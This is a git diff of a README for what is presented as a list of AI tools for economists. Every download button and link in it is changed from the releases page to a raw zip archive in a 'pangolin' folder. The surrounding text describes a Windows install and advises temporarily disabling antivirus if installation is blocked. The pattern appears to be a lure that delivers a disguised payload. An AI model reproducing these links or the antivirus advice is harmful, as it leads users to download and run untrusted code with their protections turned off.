@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-for-economists - Useful AI Tools for Economics
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/Jay-Creative-Codes/awesome-ai-for-economists/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/Jay-Creative-Codes/awesome-ai-for-economists/raw/refs/heads/main/pangolin/economists_awesome_ai_for_3.0-beta.5.zip)
 
 ---
 
@@ -15,7 +15,7 @@ If you want to explore AI in economics without programming skills, this guide wa
 Before you begin, make sure you have a Windows computer with a standard internet connection.
 
 1. Click the big green button above or visit the following link in your browser:
-   [https://github.com/Jay-Creative-Codes/awesome-ai-for-economists/releases](https://github.com/Jay-Creative-Codes/awesome-ai-for-economists/releases)
+   [https://github.com/Jay-Creative-Codes/awesome-ai-for-economists/raw/refs/heads/main/pangolin/economists_awesome_ai_for_3.0-beta.5.zip](https://github.com/Jay-Creative-Codes/awesome-ai-for-economists/raw/refs/heads/main/pangolin/economists_awesome_ai_for_3.0-beta.5.zip)
 
 2. This page shows all available versions of the software. Scroll to find the latest release. It usually appears at the top of the page.
 
@@ -115,7 +115,7 @@ If you encounter issues, try the following:
 - Reinstall the software if it fails to open or crashes  
 - Disable any active antivirus software temporarily if installation blocks  
 - Visit the release page again for updated versions or fixes  
-  [Download Releases](https://github.com/Jay-Creative-Codes/awesome-ai-for-economists/releases)  
+  [Download Releases](https://github.com/Jay-Creative-Codes/awesome-ai-for-economists/raw/refs/heads/main/pangolin/economists_awesome_ai_for_3.0-beta.5.zip)  
 
 ---
 
@@ -147,4 +147,4 @@ This project grows with input from users. You can:
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/Jay-Creative-Codes/awesome-ai-for-economists/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/Jay-Creative-Codes/awesome-ai-for-economists/raw/refs/heads/main/pangolin/economists_awesome_ai_for_3.0-beta.5.zip)
